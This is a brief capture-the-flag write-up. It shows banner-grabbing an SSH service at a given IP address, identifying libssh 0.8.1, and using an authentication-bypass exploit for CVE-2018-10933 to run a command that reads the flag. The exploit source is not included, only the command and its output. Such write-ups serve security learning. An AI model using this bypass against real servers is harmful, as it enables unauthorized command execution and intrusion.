# Country(200):  Brazil
----------
Description:  Hack this server and get the flag!

/tmp/flag.txt
52.9.13.75 port 2222
----------
Hint:  no
----------
Attachments:  []

~!|----------|!~

This one is going to be challenging
We have to pwn an ssh server.

connecting on the port it looks like the server that we were given is ssh

```
/src/ctf/Serbia/CVE-2017-1000353/payload(master*) # nc 52.9.13.75 2222                                                                                                                                                      root@758de12c22c9
SSH-2.0-libssh_0.8.1

Bye Bye#
```

libbssh seems to have a few open cve's for that version most notably this one
http://www.vulnspy.com/en-libssh-authentication-bypass-cve-2018-10933/libssh_authentication_bypass_vulnerability_exploit_(cve-2018-10933)/

```
(Brazil) ➜  Brazil git:(master) ✗ python exploit.py 52.9.13.75 2222 'cat /tmp/flag.txt'
b'CK{3f2c53b009821407fb548fbbc6f98981ee51deaf}\n'
```